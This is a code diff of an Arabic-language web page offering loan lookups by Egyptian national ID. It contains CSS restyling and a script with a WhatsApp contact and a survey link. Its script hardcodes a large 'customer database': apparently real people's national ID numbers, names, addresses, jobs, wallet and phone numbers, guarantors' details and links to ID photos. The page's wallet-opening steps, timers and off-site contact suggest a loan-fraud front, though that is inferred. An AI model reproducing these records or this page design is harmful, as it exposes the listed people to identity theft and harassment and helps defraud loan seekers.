+    background: linear-gradient(135deg, var(--warning), #B45309);
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
   .open-wallet-box .ow-steps .ow-step strong { color: var(--warning); font-weight: 800; }
-  .open-wallet-box .ow-timer-note { background: #FFFFFF; border: 1.5px dashed var(--warning); border-radius: var(--radius-sm); padding: 0.7rem 1rem; margin: 0.7rem 0; text-align: center; font-size: 0.8rem; color: var(--warning); font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
-  .open-wallet-box .ow-apology { background: linear-gradient(135deg, var(--danger-light), #FEF2F2); border: 1px solid rgba(220,38,38,0.2); border-radius: var(--radius-sm); padding: 0.7rem 0.9rem; margin: 0.7rem 0; font-size: 0.78rem; color: var(--danger); font-weight: 700; text-align: center; line-height: 1.8; }
-  .transparency-box { background: linear-gradient(135deg, var(--info-light), #EFF6FF); border: 1px solid rgba(37,99,235,0.2); border-radius: var(--radius); padding: 1.1rem; margin: 0.9rem 0; }
-  .transparency-box .trans-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.7rem; }
+
+  .open-wallet-box .ow-timer-note {
+    background: #FFFFFF;
+    border: 1.5px dashed var(--warning);
+    border-radius: var(--radius-sm);
+    padding: 0.7rem 1rem;
+    margin: 0.7rem 0;
+    text-align: center;
+    font-size: 0.8rem;
+    color: var(--warning);
+    font-weight: 800;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+  }
+
+  .open-wallet-box .ow-apology {
+    background: linear-gradient(135deg, var(--danger-light), #FEF2F2);
+    border: 1px solid rgba(220,38,38,0.2);
+    border-radius: var(--radius-sm);
+    padding: 0.7rem 0.9rem;
+    margin: 0.7rem 0;
+    font-size: 0.78rem;
+    color: var(--danger);
+    font-weight: 700;
+    text-align: center;
+    line-height: 1.8;
+  }
+
+  .transparency-box {
+    background: linear-gradient(135deg, var(--info-light), #EFF6FF);
+    border: 1px solid rgba(37,99,235,0.2);
+    border-radius: var(--radius);
+    padding: 1.1rem;
+    margin: 0.9rem 0;
+  }
+  .transparency-box .trans-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    margin-bottom: 0.7rem;
+  }
   .transparency-box .trans-header i { color: var(--info); font-size: 1.3rem; }
   .transparency-box .trans-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--info); }
   .transparency-box ul { list-style: none; padding: 0; }
-  .transparency-box ul li { display: flex; align-items: flex-start; gap: 0.5rem; padding: 0.35rem 0; font-size: 0.78rem; color: var(--text); line-height: 1.7; }
+  .transparency-box ul li {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+    padding: 0.35rem 0;
+    font-size: 0.78rem;
+    color: var(--text);
+    line-height: 1.7;
+  }
   .transparency-box ul li i { color: var(--success); font-size: 0.85rem; margin-top: 0.35rem; flex-shrink: 0; }
-  .btn-whatsapp { width: 100%; padding: 0.95rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, #25D366, #128C7E); color: #FFFFFF; font-weight: 800; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; cursor: pointer; box-shadow: 0 6px 20px rgba(37,211,102,0.25); margin-top: 0.8rem; font-family: var(--font); }
+
+  .btn-whatsapp {
+    width: 100%;
+    padding: 0.95rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, #25D366, #128C7E);
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    cursor: pointer;
+    transition: 0.25s;
+    box-shadow: 0 6px 20px rgba(37,211,102,0.25);
+    margin-top: 0.8rem;
+    font-family: var(--font);
+  }
   .btn-whatsapp:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(37,211,102,0.4); }
-  .btn-upload { width: 100%; padding: 0.95rem; border: none; border-radius: 3rem; background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #FFFFFF; font-weight: 800; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 0.7rem; cursor: pointer; box-shadow: 0 6px 20px rgba(184,145,46,0.25); margin-top: 0.8rem; font-family: var(--font); }
+
+  .btn-upload {
+    width: 100%;
+    padding: 0.95rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.7rem;
+    cursor: pointer;
+    transition: 0.25s;
+    box-shadow: 0 6px 20px rgba(184,145,46,0.25);
+    margin-top: 0.8rem;
+    font-family: var(--font);
+  }
   .btn-upload:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(184,145,46,0.4); }
-  .error-box { background: var(--danger-light); border: 1px solid rgba(220,38,38,0.2); border-radius: var(--radius); padding: 1.2rem; text-align: center; color: var(--danger); font-size: 0.85rem; display: none; margin-top: 0.8rem; font-weight: 600; line-height: 1.8; }
+
+  .error-box {
+    background: var(--danger-light);
+    border: 1px solid rgba(220,38,38,0.2);
+    border-radius: var(--radius);
+    padding: 1.2rem;
+    text-align: center;
+    color: var(--danger);
+    font-size: 0.85rem;
+    display: none;
+    margin-top: 0.8rem;
+    font-weight: 600;
+    line-height: 1.8;
+  }
   .error-box i { font-size: 1.8rem; display: block; margin-bottom: 0.4rem; }
+
   .loader { text-align: center; display: none; padding: 1.5rem 0; }
   .loader i { color: var(--primary); font-size: 2rem; }
   .loader p { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.4rem; font-weight: 600; }
+
   @media (max-width: 440px) {
     body { padding: 0.6rem; }
     .app-container { padding: 1rem 0.9rem; border-radius: 1.6rem; }
     .watermark::before { font-size: 5rem; }
     .watermark::after { font-size: 1rem; line-height: 3rem; }
     .loan-card .loan-amount-main { font-size: 2.2rem; }
+    .loan-details-grid { gap: 0.4rem; }
+    .loan-details-grid .detail-item .value { font-size: 0.78rem; }
     .search-box { flex-direction: column; }
     .search-box button { width: 100%; justify-content: center; }
     .brand h1 { font-size: 1.15rem; }
     .brand .icon { width: 42px; height: 42px; font-size: 1.3rem; }
+    .promo-strip { font-size: 0.62rem; padding: 0.45rem 0.8rem; }
     .client-info .row { font-size: 0.78rem; }
     .step-cards .step-card { padding: 0.8rem 0.85rem; }
     .step-cards .step-card .step-num { min-width: 36px; height: 36px; font-size: 1rem; }
     .open-wallet-box .ow-steps .ow-step { font-size: 0.76rem; padding: 0.7rem 0.8rem; }
+  }
+  @media (max-width: 360px) {
+    .loan-card .loan-amount-main { font-size: 1.8rem; }
+    .loan-details-grid { grid-template-columns: 1fr 1fr; }
+    .header .badge { display: none; }
   }
 </style>
 </head>
@@ -185,6 +837,7 @@
       <div class="tab"><i class="fas fa-shield-halved"></i> 🛡️ شفافية وأمان</div>
     </div>
 
+    <!-- ✨ صندوق البحث — جديد -->
     <div class="search-box">
       <input type="text" id="nationalId" placeholder="🔢 أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
       <button onclick="searchCustomer()"><i class="fas fa-search"></i> 🔍 استعلام</button>
@@ -205,54 +858,660 @@
   </div>
 
 <script>
+  // ================================================================
+  //  إعدادات عامة
+  // ================================================================
   const WHATSAPP_NUMBER = "+12519108713";
   const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
-  const SURVEY_URL = "https://surveymars.com/q/Tg7v3ahQU";
+  const SURVEY_URL = "https://surveymars.com/q/dFK8HIBuh";
 
-  const customersDatabase = {
-    "28103220200603": { id: "28103220200603", name: "مها صابر محمود محمد", job: "عندي جراح ومحل جملة وقطاعي", loan: 150000, loanTerm: "48 شهر", installment: "4205", total: "201840 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01282128864", status: "approved", idVerificationImage: "https://i.postimg.cc/j2c62Xz5/21-16-inbound5800651662608650368.jpg", guarantor: { name: "احمد اسماعيل حسن فرج الله نعمان", relation: "ابن", phone: "0121473543" }, address: "28 ش عبدالله النديم محرم بك - الإسكندرية" },
-    "29705240102148": { id: "29705240102148", name: "عايده رمضان برعي اسماعيل", job: "مدرسة انجليزي", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01145685818", status: "approved", idVerificationImage: "https://i.postimg.cc/Pfy1mSwj/17-16-inbound8611786187050784723.jpg", guarantor: { name: "غير مسجل", relation: "زوج", phone: "01111016458" }, address: "واحد شارع عبدالله مهران - مصر القديمة" },
-    "28709261700055": { id: "28709261700055", name: "احمد ابراهيم عبدالعظيم محمد", job: "مسئول أول ائتمان", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01002051998", status: "approved", idVerificationImage: "https://i.postimg.cc/2j9VkMWb/19-16-inbound836596920410636358.jpg", guarantor: { name: "اخلاص السيد صابر مختار", relation: "زوجة", phone: "01092752844" }, address: "ش بين الكوم - المنوفية" },
-    "28601232400837": { id: "28601232400837", name: "محمد طه محمد سليمان", job: "عامل في شركة النساجون الشارقون", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01019003262", status: "approved", idVerificationImage: "https://i.postimg.cc/QMjXkJ5Z/11-16-inbound923295521363807707.jpg", guarantor: { name: "رشا طه محمد سليمان", relation: "أخت", phone: "01050677042" }, address: "العاشر من رمضان - الشرقية" },
-    "28109082701963": { id: "28109082701963", name: "فاطمة محمد الصادق إبراهيم", job: "وريثة معاش قوات مسلحة", loan: 100000, loanTerm: "32 شهر", installment: "4157", total: "133024 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01004832454", status: "approved", idVerificationImage: "https://pdftourl.net/images/1789900455941-64055739-9cda-4633-ad43-d23c44217084.jpg", guarantor: { name: "عمر على لبيب حسين", relation: "زوج", phone: "01022897235" }, address: "جنوب سيناء - دهب - المدينة ع4 بجوار موقف شرق الدلتا" },
-    "29304282401132": { id: "29304282401132", name: "ايمن صلاح رجب محمد", job: "سكرتير في عيادة", loan: 80000, loanTerm: "30 شهر", installment: "3550", total: "106500 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01114184065", status: "approved", idVerificationImage: "https://pdftourl.net/images/1789901497804-d0a60620-11c1-483f-9f7c-35f7ba3633f8.jpg", guarantor: { name: "غاده احمد عبد العظيم احمد", relation: "زوجة", phone: "01141723690" }, address: "المنيا - مركز ملوي" },
-    "29303282703434": { id: "29303282703434", name: "شعبان محمد صلاح محروس عبد المجيد", job: "محامي حر", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "0110282618", status: "approved", idVerificationImage: "https://pdftourl.net/images/1789900879117-c06e4540-feb4-41da-8016-c24de4a2effe.jpg", guarantor: { name: "امل محمد شحات فاوي", relation: "زوجة", phone: "01110969247" }, address: "مساكن المظلوم القديمه بلوك 4م1" },
-    "27902111800338": { id: "27902111800338", name: "عبدالحميد سعيد رمضان ابوشناف", job: "شغال بشركة سينوريتا للصناعات الغذائية بالمخازن", loan: 125000, loanTerm: "38 شهر", installment: "4035", total: "153330 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01035151170", status: "approved", idVerificationImage: "https://i.postimg.cc/rw0Ckt5J/IMG-20260920-163355.jpg", guarantor: { name: "دعاء عبده عبدالوهاب بدري", relation: "زوجة", phone: "01032535430" }, address: "الدرمللي تبع منشأة ناصر - دمنهور - البحيرة" },
-    "27109170103011": { id: "27109170103011", name: "عمرو فاضل حسين عماره", job: "فني تشغيل وزارة الثقافة صندوق التنمية الثقافية", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01124762321", status: "approved", idVerificationImage: "https://i.postimg.cc/tTZY1h4J/10-16-inbound4292954775920867295.jpg", guarantor: { name: "سماح شعبان ابراهيم سالم", relation: "زوجة", phone: "01148185747" }, address: "7ش الخارطة الجديدة الزهراء - مصر القديمة - القاهرة" },
-    "29507150200772": { id: "29507150200772", name: "محمود عبد المنعم محمود محمد", job: "مندوب مبيعات", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01287004350", status: "approved", idVerificationImage: "https://i.postimg.cc/52YGRyy4/7-16-inbound2506400491977580977.jpg", guarantor: { name: "غير مسجل", relation: "أخت", phone: "01551353444" }, address: "٣٢ شارع الزهراء العصافرة قبلي أول المنتزه - الإسكندرية" },
-    "28309062102299": { id: "28309062102299", name: "أحمد محمد عبد الغفار عبد الحفيظ", job: "عامل بوفيه بمصنع شربات", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01007312353", status: "approved", idVerificationImage: "https://i.postimg.cc/hvYxPw37/15-16-inbound4291426505243579400.jpg", guarantor: { name: "فتحي محمد عبد الغفار عبد الحفيظ", relation: "أخت", phone: "01125086720" }, address: "أوسيم شارع درب عبد الاله" },
-    "29001011422981": { id: "29001011422981", name: "ايناس صابر يوسف فرح", job: "تاجرة ملابس", loan: 90000, loanTerm: "30 شهر", installment: "3990", total: "119700 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01034143587", status: "approved", idVerificationImage: "https://i.postimg.cc/Qxb0yS4T/17-16-inbound1189903481443158774.jpg", guarantor: { name: "حليمة السيد فرح العتاني", relation: "والدة", phone: "01028250873" }, address: "الرملة - مركز بنها" },
-    "29111122800216": { id: "29111122800216", name: "محمود عبدالرحمن السمان عبدالرحمن", job: "صناعي تشطيب ديكور المنزل", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01204285824", status: "approved", idVerificationImage: "https://i.postimg.cc/Prw8LqD9/16-16-inbound3083029038306914280.jpg", guarantor: { name: "امنه عبدالباسط احمد حمزه", relation: "والدة", phone: "01104285824" }, address: "أسوان - ادقو العدوه" },
-    "28904210102827": { id: "28904210102827", name: "نهلة عبد المجيد احمد عبد المجيد", job: "تفصيل وبيع جاهز ملابس ومفروشات", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01284123259", status: "approved", idVerificationImage: "https://i.postimg.cc/SK3hzmCc/21-16-inbound8437198349515085497.jpg", guarantor: { name: "ايات عبد المجيد احمد عبد المجيد", relation: "أخت", phone: "01284238181" }, address: "1 ش عبد العال احمد من ش المنشيه - ميدان الساعه - طلبيه فيصل" },
-    "28002060100282": { id: "28002060100282", name: "فتحية طه احمد عبد العزيز فايد", job: "مساعدة تمريض", loan: 45000, loanTerm: "18 شهر", installment: "3325", total: "59850 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01143466854", status: "approved", idVerificationImage: "https://i.postimg.cc/kGwYKyLG/22-16-inbound4283203867089269883.jpg", guarantor: { name: "مؤمن محمد عبد النبي حموده", relation: "ابن", phone: "01032075362" }, address: "الاسكان الصناعي شبرا الخيمة 13" },
-    "27306062100951": { id: "27306062100951", name: "محمد سيد عبد الحفيظ رفاعي", job: "شركة التعاون للبترول - المسؤول الوظيفي مدار إدارة", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01113264306", status: "approved", idVerificationImage: "https://i.postimg.cc/3JZYJZDz/Screenshot-2026-09-21-17-49-32-78-a23b203fd3aafc6dcb84e438dda678b6.jpg", guarantor: { name: "مصطفى محمد سيد عبد الحفيظ", relation: "ابن", phone: "01103202053" }, address: "الجيزة الهرم - ش 13 شارع خالد بن الوليد" },
-    "29704252500797": { id: "29704252500797", name: "ابانوب سامي عبدالله مني", job: "مقاولات جبس - مورد", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01279887935", status: "approved", idVerificationImage: "https://i.postimg.cc/rmYdD3y5/51-17-inbound6282945152799696761.jpg", guarantor: { name: "نسمه ابراهيم راشد عبد السيد", relation: "زوجة", phone: "01223618490" }, address: "القليوبيه - الخصوص - شارع جمال عبد الناصر" },
-    "27012051701569": { id: "27012051701569", name: "زاهية جمال الدين محمود الضبع", job: "تجارة أحذية", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01010057233", status: "approved", idVerificationImage: "https://i.postimg.cc/0ynBJYCR/14-16-inbound970964559172343755.jpg", guarantor: { name: "اسماء رمضان كمال سلطان", relation: "ابنة", phone: "01010033852" }, address: "ش الصاغة الشهداء - المنوفية" },
-    "29802101201315": { id: "29802101201315", name: "اسلام أسامه عبد الهادي راجح", job: "تجارة في المكن اللوط", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01060525458", status: "approved", idVerificationImage: "https://i.postimg.cc/3NMBq1Tk/7-16-inbound3528414821944310925.jpg", guarantor: { name: "نبيه محمد الشحات يوسف", relation: "زوجة", phone: "01559910226" }, address: "كفر أبو سيد أحمد - مركز شربين - الدقهلية" },
-    "29410010217094": { id: "29410010217094", name: "اسلام فايز رجب محمود", job: "محاسب", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01271648233", status: "approved", idVerificationImage: "https://i.postimg.cc/HxdRNT9G/8-16-27A776B1-C114-46AA-97CC-BB739181FD96.jpg", guarantor: { name: "مهاب", relation: "زوج", phone: "01555221564" }, address: "الإسكندرية" },
-    "30201012412959": { id: "30201012412959", name: "عبدالله شعبان ناصر طلب", job: "شغال في سوبر ماركت", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01004893861", status: "approved", idVerificationImage: "https://i.postimg.cc/qvgmDjhD/15-16-inbound6157651196907867569.jpg", guarantor: { name: "ولاء ناصر خميس غانم", relation: "زوجة", phone: "01142629339" }, address: "الجيزة - بولاق الدكرور - شارع عبدالمنعم" },
-    "26906090101061": { id: "26906090101061", name: "هدى سيد محمد احمد", job: "أخصائي شئون إدارية", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01117686954", status: "approved", idVerificationImage: "https://i.postimg.cc/VvnSNyVB/23-16-inbound8014761145520934331.jpg", guarantor: { name: "ياسمين رمضان فؤاد عبد الموجود", relation: "ابنة", phone: "01204258723" }, address: "٣٨ شارع الحكيم - مهمشة - الشرابية" },
-    "27805151802711": { id: "27805151802711", name: "حسين شعبان حسين عبيد", job: "سائق حر", loan: 175000, loanTerm: "48 شهر", installment: "4848", total: "232704 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01146574428", status: "approved", idVerificationImage: "https://i.postimg.cc/L8SW5HGJ/24-16-inbound4379315643646967679.jpg", guarantor: { name: "منى إبراهيم عبد المنعم", relation: "زوجة", phone: "01146574427" }, address: "ش خطاب سيدى شحاته - كفر الدوار - البحيرة" },
-    "28703182100087": { id: "28703182100087", name: "رشا احمد عبد المعطي أبو العلا", job: "موظفة حي جنوب الجيزة", loan: 70000, loanTerm: "26 شهر", installment: "3585", total: "93210 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01026225699", status: "approved", idVerificationImage: "https://i.postimg.cc/JzGL3311/Screenshot-2026-09-29-18-17-42-14-99c04817c0de5652397fc8b56c3b3817.jpg", guarantor: { name: "فاطمه احمد عبد المعطي أبو العلا", relation: "أخت", phone: "01127155346" }, address: "40 شارع عبد العال يوسف - ساقية مكي - الجيزة" },
-    "28811110104816": { id: "28811110104816", name: "رامي زكريا فهمى ابراهيم", job: "فنى في شركة أدوية", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01225507747", status: "approved", idVerificationImage: "", guarantor: { name: "مرينا صابر صادق جريس", relation: "زوجة", phone: "01287220670" }, address: "١٣ درب بشاي عبد الملك - من شارع رقى المعارف - جزيرة بدران أول - شبرا مصر" },
-    "27001042100577": { id: "27001042100577", name: "محمد البشير يحي عبد المولي", job: "شركة جنوب القاهرة للتوزيع الكهرباء - الهرم إيرادات", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01120311698", status: "approved", idVerificationImage: "", guarantor: { name: "صلاح محمد البشير يحي عبد المولي", relation: "ابن", phone: "01120311968" }, address: "كفر شحاته - العياط - الجيزة" },
-    "29108262102143": { id: "29108262102143", name: "ياسمين رمضان فؤاد عبد الموجود", job: "بايعة أدوات منزلية", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01117686954", status: "approved", idVerificationImage: "", guarantor: { name: "هدى سيد محمد احمد", relation: "والدة", phone: "01117686954" }, address: "٣٨ شارع الحكيم - مهمشة - الشرابية" },
-    "29101011212077": { id: "29101011212077", name: "السيد محمد محمد محمد", job: "مدير مخازن", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01132745677", status: "approved", idVerificationImage: "", guarantor: { name: "عمر محمد محمد محمد", relation: "أخ", phone: "01116683146" }, address: "جصفا - مركز ميت غمر - الدقهلية" },
-    "28511102102461": { id: "28511102102461", name: "ناديه شحاته سلامه عيسى", job: "ربة منزل بتاجر في الملابس", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01030687085", status: "approved", idVerificationImage: "", guarantor: { name: "محمود عبدالرحمن حسان بحراوى", relation: "زوج", phone: "01093563947" }, address: "مركز كرداسة - الجيزة" },
-    "26804242101855": { id: "26804242101855", name: "ثروت عزمى راغب عبود", job: "سايق أوبر مع عربية", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01070294328", status: "approved", idVerificationImage: "", guarantor: { name: "ماهر فوزى راغب عبود", relation: "أخ", phone: "01000431822" }, address: "أوسيم - بجوار مستشفى أوسيم - الجيزة" },
-    "30207091700571": { id: "30207091700571", name: "محمد مجدي احمد", job: "شيف", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01117461279", status: "approved", idVerificationImage: "", guarantor: { name: "عبدالرحمن مجدي احمد صالح", relation: "أخ", phone: "01152220547" }, address: "الجيزة - شارع فرحات" },
-    "27209171500697": { id: "27209171500697", name: "وائل حسينى مرسى حموده", job: "أخصائي اجتماعى لدى منشأة", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01014378029", status: "approved", idVerificationImage: "", guarantor: { name: "منة الله وائل حسينى مرسى", relation: "ابنة", phone: "01033949061" }, address: "14 ش البدوى من داير الناحية - الإسماعيلية" },
-    "26503011100767": { id: "26503011100767", name: "بسيمه سعد محمد سلامه", job: "كبير معلمين بالمعاش", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01093752935", status: "approved", idVerificationImage: "", guarantor: { name: "رياض حسن على سالم ابو العيله", relation: "زوج", phone: "01226484494" }, address: "دمياط الجديدة - شارع الإمارات - بجوار مسجد نور" },
-    "28202182403552": { id: "28202182403552", name: "جوزيف مختار شوقي ابواليمين", job: "فني صيانة خطوط شبكات المنيا", loan: 150000, loanTerm: "48 شهر", installment: "4205", total: "201840 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01006132806", status: "approved", idVerificationImage: "", guarantor: { name: "مختار شوقي ابواليمين بطرس", relation: "أب", phone: "01220099530" }, address: "٢٠ شارع الحرمين - حى مكه - أبوهلال - المنيا" },
-    "27005232500798": { id: "27005232500798", name: "رمزى فتحى جورجى عبدالملاك", job: "مخزن خردة حديد", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01145154294", status: "approved", idVerificationImage: "", guarantor: { name: "حلاوتهم فايز بخيت بشاى", relation: "زوجة", phone: "01272000952" }, address: "٣ ش محمد ابرهيم - عزبة العرب - أرض اللواء" },
-    "27710060201942": { id: "27710060201942", name: "نسرين كمال عبد الفتاح احمد", job: "صاحبة نشاط تجارى", loan: 50000, loanTerm: "24 شهر", installment: "2725", total: "65400 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01115792959", status: "approved", idVerificationImage: "", guarantor: { name: "ايمن محمد عبد المنعم سراج الدين", relation: "زوج", phone: "01115792959" }, address: "شارع ربيع متفرع من المعهد - العصافرة" },
-    "30302282800064": { id: "30302282800064", name: "اسماء سمير احمد محمد", job: "موظفة استقبال", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01151092352", status: "approved", idVerificationImage: "https://i.postimg.cc/GpCmL9vQ/42-16-20260927-222213.jpg", guarantor: { name: "شوقيه مسلم محمد بدر", relation: "والدة", phone: "01101944908" }, address: "السيل الريفي - شرق مستشفى الصدر" },
-    "30308080201159": { id: "30308080201159", name: "يوسف ايمن محمد عبد المنعم", job: "شركة توزيع منتجات", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01080362122", status: "approved", idVerificationImage: "", guarantor: { name: "نسرين كمال عبد الفتاح احمد", relation: "والدة", phone: "01557709292" }, address: "360 ش الملك حفني - عصافرة بحري - السكة" },
-    "27307240200619": { id: "27307240200619", name: "عمرو علي حسن علي", job: "مشرف بشركة ليسيكو مصر", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01555742473", status: "approved", idVerificationImage: "", guarantor: { name: "فرح عمرو علي حسن", relation: "ابنة", phone: "01159462839" }, address: "الإسكندرية - ١ شارع الناضورى - راس التين - الجمرك" },
-    "27501171701059": { id: "27501171701059", name: "محمد نادي محمدى محمد", job: "مشرف قسم صيانة كهرباء في شركة العربي", loan: 150000, loanTerm: "48 شهر", installment: "4205", total: "201840 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01027007607", status: "approved", idVerificationImage: "", guarantor: { name: "اسماء عبد الرازق محمدى محمد", relation: "زوجة", phone: "01110331940" }, address: "شارع فتحي الحداد متفرع من شارع الجلاء - قويسنا المحطة - المنوفية" },
-    "29311271202517": { id: "29311271202517", name: "محمد رمضان إبراهيم المناوي", job: "مصنع حلويات الزهور", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01040715595", status: "approved", idVerificationImage: "", guarantor: { name: "مني أحمد الغريب النوساني", relation: "والدة", phone: "01283350843" }, address: "سمنود سماحه - مركز سمنود" },
-    "27609131100147": { id: "27609131100147", name: "داليا التابعي حسن ابو حجازي", job: "أعمل في مجال العطارة", loan: 70000, loanTerm: "26 شهر", installment: "3585", total: "93210 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "محفظة أخرى", walletNum: "01092671370", status: "approved", idVerificationImage: "", guarantor: { name: "تفيده طاهر محمد اللضام", relation: "والدة", phone: "01019377187" }, address: "دمياط - قرية العنانية - بجوار مصنع التلج ومسجد العاشر من رمضان" }
-  };
+  // ================================================================
+  //  قاعدة البيانات — نفس بنية كود الاستعلام
+  // ================================================================
+const customersDatabase = {
+  "29705240102148": {
+    id: "29705240102148",
+    name: "عايده رمضان برعي اسماعيل",
+    job: "مدرسة انجليزي",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01145685818",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/Pfy1mSwj/17-16-inbound8611786187050784723.jpg",
+    guarantor: { name: "غير مسجل", relation: "زوج", phone: "01111016458" },
+    address: "واحد شارع عبدالله مهران - مصر القديمة"
+  },
+  "28103220200603": {
+    id: "28103220200603",
+    name: "مها صابر محمود محمد",
+    job: "عندي جراح ومحل جملة وقطاعي",
